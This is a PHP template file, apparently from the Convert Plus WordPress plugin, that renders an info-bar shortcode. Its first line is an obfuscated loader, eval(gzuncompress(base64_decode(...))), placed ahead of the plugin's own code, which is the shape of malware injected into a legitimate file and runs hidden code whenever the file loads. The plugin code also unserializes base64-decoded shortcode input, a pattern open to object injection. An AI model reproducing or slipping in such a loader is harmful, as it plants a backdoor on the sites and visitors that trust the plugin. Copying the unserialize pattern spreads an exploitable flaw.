<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

if ( ! function_exists( 'info_bar_theme_weekly_article' ) ) {
	/**
	 * Function Name: info_bar_theme_weekly_article.
	 *
	 * @param  array  $atts    setting array.
	 * @param  string $content string content.
	 * @return mixed          content.
	 */
	function info_bar_theme_weekly_article( $atts, $content = null ) {
		$style_id         = '';
		$settings_encoded = '';
		shortcode_atts(
			array(
				'style_id'         => '',
				'settings_encoded' => '',
			), $atts
		);
		$style_id         = $atts['style_id'];
		$settings_encoded = $atts['settings_encoded'];

		$settings       = base64_decode( $settings_encoded );
		$style_settings = unserialize( $settings );

		foreach ( $style_settings as $key => $setting ) {
			$style_settings[ $key ] = apply_filters( 'smile_render_setting', $setting );
		}

		unset( $style_settings['style_id'] );

		// Generate UID.
		$uid       = uniqid();
		$uid_class = 'content-' . $uid;

		// Individual style variables.
		$individual_vars = array(
			'uid'         => $uid,
			'uid_class'   => $uid_class,
			'style_class' => 'cp-weekly-article',
		);

		global $cp_form_vars;

		/**
		 * Merge short code variables arrays.
		 *
		 * @array   $individual_vars        Individual style EXTRA short code variables.
		 * @array   $style_settings         Individual style short code variables.
		 * @array   $cp_form_vars           CP Form global short code variables.
		 */
		$all = array_merge(
			$individual_vars,
			$style_settings,
			$cp_form_vars,
			$atts
		);

		// Extract short code variables.
		$a = shortcode_atts( $all, $style_settings );

		/** = Before filter.
		 *-----------------------------------------------------------*/
		apply_filters_ref_array( 'cp_ib_global_before', array( $a ) );

		$el_class            = '';
		$info_bar_size_style = '';
		$close_class         = '';

		$button_css = 'background:' . $a['button_bg_color'] . ';';

		// info bar image.
		$cp_module_img_custom_url = isset( $a['info_bar_img_custom_url'] ) ? $a['info_bar_img_custom_url'] : '';
		$cp_module_img_src        = isset( $a['info_bar_img_src'] ) ? $a['info_bar_img_src'] : '';
		$cp_module_image          = isset( $a['info_bar_image'] ) ? $a['info_bar_image'] : '';

		// Filters & Actions.
		$info_bar_image = cp_get_module_image_url_init( 'info-bar', $cp_module_img_custom_url, $cp_module_img_src, $cp_module_image );

		// Filters & Actions for modal_image_alt.
		$info_bar_alt = cp_get_module_image_alt_init( 'info-bar', $cp_module_img_src, $cp_module_image );

		$imagestyle  = cp_add_css( 'max-width', $a['image_size'], 'px' );
		$imagestyle .= cp_add_css( 'width', $a['image_size'], 'px' );

		$img_class = '';
		if ( $a['image_displayon_mobile'] ) {
			$img_class .= 'cp_ifb_hide_img';
		}

		// Merge arrays - 'shortcode atts' & 'style options'.
		$a = array_merge( $a, $atts );

		$convert_plug_settings = get_option( 'convert_plug_settings' );
		$images_on_load        = isset( $convert_plug_settings['cp-lazy-img'] ) ? $convert_plug_settings['cp-lazy-img'] : 1;

		?>
		<?php if ( '' !== $info_bar_image ) { ?>
		<div class="cp-image-container">
			<?php if ( $images_on_load ) { ?>
				<img style="<?php echo esc_attr( $imagestyle ); ?>" data-src="<?php echo esc_attr( $info_bar_image ); ?>" class="cp-image <?php echo esc_attr( $img_class ); ?>" <?php echo $info_bar_alt; ?> >
			<?php } else { ?>
				<img style="<?php echo esc_attr( $imagestyle ); ?>" src="<?php echo esc_attr( $info_bar_image ); ?>" class="cp-image <?php echo esc_attr( $img_class ); ?>" <?php echo $info_bar_alt; ?> >
			<?php } ?>		
		</div> <?php } ?>
		<div class="cp-msg-container <?php echo ( '' === trim( $a['infobar_title'] ) ? 'cp-empty' : '' ); ?>">
			<span class="cp-info-bar-msg"><?php echo do_shortcode( html_entity_decode( stripcslashes( $a['infobar_title'] ) ) ); ?></span>
		</div>
		<div class="cp-flex cp-sub-container">
			<div class="cp-form-container">
				<?php
						/**
						 * Embed CP Form.
						 */
						apply_filters_ref_array( 'cp_get_form', array( $a ) );
						?>
					</div>
					<div class="cp-flex cp-info-bar-desc-container <?php echo ( '' === trim( $a['infobar_description'] ) ? 'cp-empty' : '' ); ?>">
						<div class="cp-info-bar-desc"><?php echo do_shortcode( html_entity_decode( stripcslashes( $a['infobar_description'] ) ) ); ?></div>
					</div>
				</div>
				<?php

				/** = After filter.
				 * -----------------------------------------------------------*/
				apply_filters_ref_array( 'cp_ib_global_after', array( $a ) );

				return ob_get_clean();
	}
}
